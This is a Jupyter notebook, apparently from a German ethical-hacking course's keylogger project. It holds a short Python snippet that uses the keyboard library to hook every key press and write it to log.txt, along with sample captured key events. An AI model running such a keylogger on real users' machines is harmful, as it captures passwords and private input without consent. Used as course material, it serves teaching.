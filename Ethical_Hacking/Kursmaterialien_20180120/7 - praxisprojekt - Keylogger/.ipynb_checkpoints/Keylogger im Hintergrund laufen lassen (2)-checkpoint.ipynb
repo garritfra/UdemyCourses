{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import keyboard"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "KeyboardEvent(right shift down)\n",
      "KeyboardEvent(enter down)\n",
      "KeyboardEvent(enter up)\n",
      "KeyboardEvent(right shift up)\n",
      "KeyboardEvent(windows down)\n",
      "KeyboardEvent(v down)\n",
      "KeyboardEvent(v up)\n",
      "KeyboardEvent(windows up)\n",
      "KeyboardEvent(tab down)\n",
      "KeyboardEvent(tab up)\n",
      "KeyboardEvent(enter down)\n",
      "KeyboardEvent(enter up)\n",
      "KeyboardEvent(enter down)\n",
      "KeyboardEvent(enter up)\n",
      "KeyboardEvent(enter down)\n",
      "KeyboardEvent(delete down)\n",
      "KeyboardEvent(delete up)\n",
      "KeyboardEvent(enter up)\n",
      "KeyboardEvent(right shift down)\n"
     ]
    }
   ],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "keyboard.unhook_all()\n",
    "\n",
    "file = open(\"./log.txt\", \"w\", encoding=\"utf-8\")\n",
    "\n",
    "def on_key(key):\n",
    "    file.write(str(key))\n",
    "\n",
    "keyboard.hook(on_key)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
